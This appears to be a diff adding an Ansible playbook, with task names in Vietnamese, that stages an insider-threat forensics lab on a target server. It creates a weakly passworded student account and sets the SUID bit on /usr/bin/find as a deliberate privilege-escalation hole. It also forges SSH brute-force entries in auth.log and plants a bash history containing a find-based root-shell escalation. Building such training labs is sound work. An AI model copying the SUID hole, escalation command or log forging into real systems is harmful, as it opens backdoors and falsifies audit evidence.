@@ -1,0 +1,40 @@
+---
+- name: Dàn dựng hiện trường tấn công Insider Threat
+  hosts: target-server
+  become: yes
+  tasks:
+    - name: Tạo tài khoản sinh viên bị lộ mật khẩu
+      user:
+        name: student_test
+        password: "$6$rounds=656000$SomeSalt$mF1/A.8v3y.a... (mã hash của '123456')"
+        shell: /bin/bash
+
+    - name: Cài đặt công cụ và thiết lập SUID cho 'find' (Lỗ hổng leo thang đặc quyền)
+      file:
+        path: /usr/bin/find
+        mode: '4755' # Cờ SUID
+
+    - name: Giấu Flag 3 (Chỉ root mới đọc được)
+      copy:
+        dest: /root/flag.txt
+        content: "KYPO{suid_find_privesc_success}"
+        mode: '0600'
+
+    - name: Giả mạo log tấn công Brute-force SSH vào /var/log/auth.log
+      shell: |
+        echo "$(date -d '1 hour ago' '+%b %d %H:%M:%S') target-server sshd[1020]: Failed password for invalid user root from 10.10.55.200 port 33012 ssh2" >> /var/log/auth.log
+        echo "$(date -d '59 mins ago' '+%b %d %H:%M:%S') target-server sshd[1025]: Failed password for student_test from 10.10.55.200 port 33044 ssh2" >> /var/log/auth.log
+        echo "$(date -d '58 mins ago' '+%b %d %H:%M:%S') target-server sshd[1030]: Accepted password for student_test from 10.10.55.200 port 33088 ssh2" >> /var/log/auth.log
+        echo "$(date -d '58 mins ago' '+%b %d %H:%M:%S') target-server sshd[1030]: pam_unix(sshd:session): session opened for user student_test by (uid=0)" >> /var/log/auth.log
+      args:
+        executable: /bin/bash
+
+    - name: Giả mạo Bash History của kẻ tấn công (thực thi SUID)
+      lineinfile:
+        path: /home/student_test/.bash_history
+        create: yes
+        line: |
+          whoami
+          id
+          find . -exec /bin/sh -p \; -quit
+          cat /root/flag.txt
